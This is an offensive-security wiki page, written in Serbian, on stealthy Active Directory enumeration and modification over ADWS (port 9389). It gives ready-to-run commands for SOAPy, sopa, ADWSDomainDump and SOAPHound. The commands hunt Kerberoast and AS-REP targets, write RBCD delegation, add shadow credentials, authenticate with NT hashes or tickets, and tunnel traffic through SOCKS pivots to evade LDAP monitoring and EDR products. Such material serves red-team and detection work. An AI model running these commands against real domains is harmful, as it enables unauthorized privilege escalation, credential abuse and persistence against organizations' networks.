# Enumeracija Active Directory Web Services (ADWS) i prikriveno prikupljanje

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **podrazumevano omogućen na svakom Domain Controller-u od Windows Server 2008 R2** i sluša na TCP portu **9389**. Uprkos nazivu, **ne koristi se HTTP**. Umesto toga, servis izlaže podatke u LDAP stilu kroz niz vlasničkih .NET protokola za kadriranje:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran u ove binarne SOAP okvire i prenosi se preko neuobičajenog porta, **mnogo je manja verovatnoća da će enumeracija preko ADWS biti nadgledana, filtrirana ili prepoznata potpisima nego klasični LDAP saobraćaj na portovima 389 i 636**. Za operatere to znači:<sup>[[1]](#references)[[7]](#references)</sup>

* Prikriveniji recon – Blue teamovi se često usredsređuju na LDAP upite.
* Mogućnost prikupljanja podataka sa **hostova koji nisu Windows (Linux, macOS)** tunelovanjem TCP porta 9389 kroz SOCKS proxy.
* Isti podaci koje biste dobili preko LDAP-a (korisnici, grupe, ACL-ovi, šema itd.) i mogućnost **upisa** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

ADWS interakcije se zasnivaju na WS-Enumeration: svaki upit počinje porukom `Enumerate` koja definiše LDAP filter/atribute i vraća GUID `EnumerationContext`, nakon čega sledi jedna ili više poruka `Pull` koje strimuju rezultate do prozora veličine koju definiše server.<sup>[[7]](#references)</sup> Konteksti ističu nakon približno 30 minuta, pa alati moraju ili da stranuju rezultate ili podele filtere (upiti po prefiksu za svaki CN) kako bi izbegli gubitak stanja.<sup>[[8]](#references)</sup> Pri traženju bezbednosnih deskriptora navedite kontrolu `LDAP_SERVER_SD_FLAGS_OID` da biste izostavili SACL-ove; u suprotnom ADWS jednostavno izostavlja atribut `nTSecurityDescriptor` iz SOAP odgovora.

> NAPOMENA: ADWS koriste i mnogi RSAT GUI/PowerShell alati, pa se saobraćaj može stopiti sa legitimnom administratorskom aktivnošću.

## SoaPy – nativni Python klijent

[SoaPy](https://github.com/logangoins/soapy) je **potpuna ponovna implementacija ADWS protokolskog steka u čistom Python-u**. Generiše NBFX/NBFSE/NNS/NMF okvire bajt po bajt, što omogućava prikupljanje podataka sa Unix-sličnih sistema bez korišćenja .NET runtime-a.<sup>[[1]](#references)[[2]](#references)</sup>

### Ključne funkcije

* Podržava **proxy saobraćaj kroz SOCKS** (korisno sa C2 implantima).
* Precizni filteri za pretragu, identični LDAP-u `-q '(objectClass=user)'`.
* Ciljane operacije **upisa** za RBCD, SPN-ove, zastavice naloga i ključne akreditive.<sup>[[2]](#references)</sup>
* SoaPy izlaz može da obradi **BOFHound** i uveze u BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Zastavica `--parse` za formatiranje vremenskih oznaka i `userAccountControl` radi lakšeg čitanja.<sup>[[2]](#references)</sup>

### Zastavice za ciljano prikupljanje i operacije upisa

SoaPy sadrži pažljivo odabrane opcije koje preko ADWS-a repliciraju najčešće LDAP zadatke za lov na mete: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, kao i opcije `--query` / `--filter` za prilagođeno prikupljanje. Uparite ih sa primitivama za upis kao što su `--rbcd <source>` (postavlja `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (postavljanje SPN-a za ciljano Kerberoasting) i `--asrep` (uključuje `DONT_REQ_PREAUTH` u `userAccountControl`).<sup>[[2]](#references)</sup>

Primer ciljane SPN pretrage koja vraća samo `samAccountName` i `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Koristite isti host/credentials da biste odmah iskoristili pronađene ranjivosti: izlistajte objekte koji su već konfigurisani za RBCD pomoću opcije `--rbcds`, a zatim primenite `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` da biste pripremili lanac Resource-Based Constrained Delegation (pogledajte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) za ceo postupak zloupotrebe).<sup>[[2]](#references)</sup>

### Instalacija (operatorski host)

Instalirajte aktuelni SOAPy CLI iz njegovog upstream repozitorijuma; naziv izvršne datoteke razlikuje velika i mala slova na Unix-like sistemima.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Prikupljanje samo pomoću ticketa preko SOCKS pivota

Ako početni pristup omogućava Kerberos ticket, ali ne i lozinku u čistom tekstu, konvertujte `.kirbi` ticket u `ccache` kao što je opisano u [Pass the Ticket](pass-the-ticket.md), a zatim usmerite SOAPy na tu keš memoriju. Ticket za LDAP servis DC-a može se koristiti u dokumentovanom SOAPy ADWS toku rada; usmerite i ADWS i Kerberos saobraćaj kroz pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials preko ADWS

Ako trenutni principal može da upisuje u `msDS-KeyCredentialLink` ciljnog objekta, SOAPy može da doda key credential preko ADWS-a i izveze odgovarajući PFX. Zabeležite vraćeni DeviceID radi preciznog uklanjanja, umesto da brišete ceo atribut. Koristite PFX za PKINIT, kao što je objašnjeno u [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump preko ADWS-a (Linux/Windows)

* Fork alata `ldapdomaindump` koji zamenjuje LDAP upite ADWS pozivima preko TCP/9389 kako bi smanjio broj detekcija LDAP potpisa.
* Obavlja početnu proveru dostupnosti porta 9389, osim ako se prosledi `--force` (preskače proveru ako su skeniranja portova bučna ili filtrirana).
* Testiran je protiv Microsoft Defender for Endpoint i CrowdStrike Falcon, uz uspešno zaobilaženje navedeno u README-u.<sup>[[4]](#references)</sup>

### Instalacija

```bash
pipx install .
```

### Upotreba

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Tipičan izlaz beleži proveru dostupnosti porta 9389, ADWS bind i početak/završetak dump-a:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Praktičan klijent za ADWS u Golang-u

Kao i soapy, [sopa](https://github.com/Macmod/sopa) implementira stek protokola ADWS (MS-NNS + MC-NMF + SOAP) u Golang-u, uz komandne opcije za izvršavanje ADWS poziva kao što su:<sup>[[5]](#references)</sup>

* **Pretraga i preuzimanje objekata** - `query` / `get`
* **Životni ciklus objekata** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Uređivanje atributa** - `attr [add|replace|delete]`
* **Upravljanje nalozima** - `set-password` / `change-password`
* i ostalo, kao što su `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` itd.

### Istaknute stavke mapiranja protokola

* Pretrage u LDAP stilu izvršavaju se pomoću **WS-Enumeration** (`Enumerate` + `Pull`), uz projekciju atributa, kontrolu opsega (Base/OneLevel/Subtree) i straničenje.
* Preuzimanje pojedinačnog objekta koristi **WS-Transfer** `Get`; izmene atributa koriste `Put`; brisanja koriste `Delete`.
* Ugrađeno kreiranje objekata koristi **WS-Transfer ResourceFactory**; prilagođeni objekti koriste **IMDA AddRequest**, kojim upravljaju YAML šabloni.
* Operacije sa lozinkama su **MS-ADCAP** akcije (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Otkrivanje metapodataka bez autentifikacije (mex)

ADWS izlaže WS-MetadataExchange bez akreditiva, što predstavlja brz način za proveru izloženosti pre autentifikacije:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Napomene o otkrivanju DNS/DC-a i usmeravanju Kerberos-a

Sopa može da pronađe DC-ove preko SRV-a ako je `--dc` izostavljen, a `--domain` naveden. Upite šalje ovim redosledom i koristi cilj sa najvišim prioritetom:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operativno, prednost dajte resolveru kojim upravlja DC da biste izbegli greške u segmentiranim okruženjima:

* Koristite `--dns <DC-IP>` da bi se **sva** SRV/PTR/forward razrešavanja obavljala preko DC DNS-a.
* Koristite `--dns-tcp` kada je UDP blokiran ili su SRV odgovori veliki.
* Ako je `--dc` IP adresa, sopa uvek obavlja **reverse PTR** lookup: ADWS `wsa:To` filter adrese zahteva FQDN čak i bez Kerberos-a. Ako nedostaje reverse zona, direktno navedite FQDN DC-a.<sup>[[5]](#references)</sup>

Primer (IP + Kerberos, forsiranje DNS-a preko DC-a):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opcije za materijal za autentifikaciju

Pored lozinki u otvorenom tekstu, sopa podržava **NT hashes**, **Kerberos AES keys**, **ccache** i **PKINIT certificates** (PFX ili PEM) za ADWS autentifikaciju. Kerberos se podrazumeva kada se koriste `--aes-key`, `-c` (ccache) ili opcije zasnovane na sertifikatima.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Kreiranje prilagođenih objekata pomoću predložaka

Za proizvoljne klase objekata, komanda `create custom` koristi YAML predložak koji se mapira na IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` i `rdn` određuju kontejner i relativni DN.
* `attributes[].name` podržava `cn` ili namespaced `addata:cn`.
* `attributes[].type` prihvata `string|int|bool|base64|hex` ili eksplicitni `xsd:*`.
* **Nemojte** uključivati `ad:relativeDistinguishedName` ili `ad:container-hierarchy-parent`; sopa ih dodaje automatski.
* Vrednosti `hex` konvertuju se u `xsd:base64Binary`; koristite `value: ""` za postavljanje praznih stringova.

## SOAPHound – Prikupljanje velike količine podataka putem ADWS-a (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) je .NET kolektor koji sve LDAP interakcije obavlja putem ADWS-a i generiše JSON kompatibilan sa BloodHound v4. Jednom izgradi potpunu keš memoriju za `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a zatim je ponovo koristi za prolaze velikog obima `--bhdump`, `--certdump` (ADCS) ili `--dnsdump` (DNS integrisan sa AD-om), tako da samo oko 35 kritičnih atributa ikada napusti DC. AutoSplit (`--autosplit --threshold <N>`) automatski deli upite prema prefiksu CN-a kako bi ostao unutar 30-minutnog vremenskog ograničenja za EnumerationContext u velikim šumama.<sup>[[8]](#references)</sup>

Uobičajeni tok rada na operatorskoj VM mašini pridruženoj domenu:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Izvezeni JSON se direktno uklapa u SharpHound/BloodHound workflow-e — pogledajte [BloodHound methodology](bloodhound.md) za ideje za dalju vizuelizaciju grafova. AutoSplit čini SOAPHound otpornim pri radu sa šumskim strukturama koje sadrže više miliona objekata, uz manji broj upita nego kod snapshot-ova u stilu ADExplorer-a.

## Stealth AD Collection Workflow

Sledeći workflow prikazuje kako da enumerišete **domain i ADCS objekte** preko ADWS-a, konvertujete ih u BloodHound JSON i tražite puteve napada zasnovane na sertifikatima — sve iz Linux-a:

1. **Tunelujte 9389/TCP** od ciljne mreže do svoje mašine (npr. pomoću Chisel-a, Meterpreter-a, SSH dinamičkog prosleđivanja portova itd.). Usmerite neobrađeni TCP klijent kroz SOCKS pomoću `proxychains4 SOAPy ...` (konfigurišite SOCKS5 adresu u `proxychains4.conf`); `HTTPS_PROXY` ne prosleđuje ovaj ne-HTTP protokol.<sup>[[9]](#references)</sup>

2. **Prikupite objekat root domena:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Prikupite objekte povezane sa ADCS-om iz Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Konvertujte u BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što je `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da biste otkrili putanje eskalacije privilegija putem sertifikata (ESC1, ESC8 itd.).

### Upisivanje atributa `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Ako imate dozvolu za upis u objekat ciljnog računara, koristite SOAPy-jevu RBCD akciju umesto sirovog security-descriptor niza. Ovde je `WEBSRV01$` kontrolisani izvor, a `FILE01$` je cilj čiji se atribut menja.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Nastavite Kerberos S4U lanac u [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Pregled alata

| Svrha | Alat | Napomene |
|---------|------|-------|
| ADWS enumeracija | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, čitanje/upis |
| ADWS dump velikog obima | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS režimi |
| Uvoz u BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konvertuje SoaPy/ldapsearch logove |
| Kompromitovanje sertifikata | [Certipy](https://github.com/ly4k/Certipy) | Može se usmeriti preko istog SOCKS-a |
| ADWS enumeracija i izmene objekata | [sopa](https://github.com/Macmod/sopa) | Generički klijent za povezivanje sa poznatim ADWS krajnjim tačkama - omogućava enumeraciju, kreiranje objekata, izmene atributa i promene lozinki |



## References

- [1] [SpecterOps – Obavezno koristite SOAP(y) – vodič za operatere za prikriveno prikupljanje podataka iz AD-a pomoću ADWS-a](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – specifikacije MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Prikrivena enumeracija Active Directory okruženja putem ADWS-a](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound alat za prikupljanje podataka iz Active Directory-ja putem ADWS-a](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – Izviđanje](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – Post-eksploatacija](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
